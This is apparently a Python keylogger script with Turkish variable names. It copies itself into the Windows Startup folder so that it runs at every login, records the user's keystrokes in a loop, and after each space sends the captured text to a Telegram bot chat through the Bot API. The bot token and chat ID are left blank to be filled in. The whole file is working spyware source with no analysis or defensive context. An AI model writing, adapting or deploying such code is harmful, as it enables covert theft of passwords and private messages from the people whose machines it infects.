import keyboard
import os
import shutil

x = os.getcwd()
kaynak = os.path.join(x, 'keyloggeree.py')


def copy_to_startup(src_file):
    # Get the user's startup folder
    startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')

    # Create the destination path
    dest_file = os.path.join(startup_folder, os.path.basename(src_file))

    # Copy the file to the startup folder
    shutil.copy(src_file, dest_file)
    print(f"{src_file} copied to startup folder.")


if __name__ == "__main__":
    # Specify the path to the Python script you want to copy to the startup folder
    python_script = kaynak
    copy_to_startup(python_script)




def tlg(message):
    import requests
    # Replace 'YOUR_BOT_TOKEN' with your bot's token
    BOT_TOKEN = ''
    # Replace 'YOUR_CHAT_ID' with your chat ID
    CHAT_ID = ''
    # Message you want to send
    message = message

    # Telegram Bot API URL for sending messages
    url = f'https://api.telegram.org/bot{BOT_TOKEN}/sendMessage'

    # Parameters for the HTTP POST request
    params = {
        'chat_id': CHAT_ID,
        'text': message
    }

    # Send the message using the requests library
    response = requests.post(url, json=params)

    # Check if the message was sent successfully
    if response.status_code == 200:
        print('Message sent successfully!')
    else:
        print(f'Failed to send message. Status code: {response.status_code}')
        print(response.text)


liste = []
# It records all the keys until escape 
while True:
    if keyboard.is_pressed("esc"):
        break
    else:
        rk = keyboard.record(until="space")
        for i in rk:
            if f"{i}"[16] == "u" and f"{i}"[17] == "p":
                x = f"{i}"[14]
                liste.append(x)
         
        liste.append(" ")
        my_string = ''.join(liste)

        print(my_string)
        tlg(my_string)

print("Its done.")

